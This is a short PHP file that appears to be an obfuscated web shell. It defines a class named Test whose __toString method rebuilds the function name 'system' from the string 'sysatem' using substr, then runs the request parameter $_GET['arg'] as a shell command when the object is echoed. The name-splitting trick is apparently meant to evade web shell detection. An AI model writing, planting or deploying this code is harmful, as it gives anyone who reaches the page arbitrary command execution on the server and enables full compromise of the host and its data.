<?php
class Test
{
    public function __toString()
    {
        $method='sysatem';
        (substr($method,0,3).substr($method, 4))($_GET['arg']);
        return '1';
    }
}
$a=new Test();
echo $a;
?>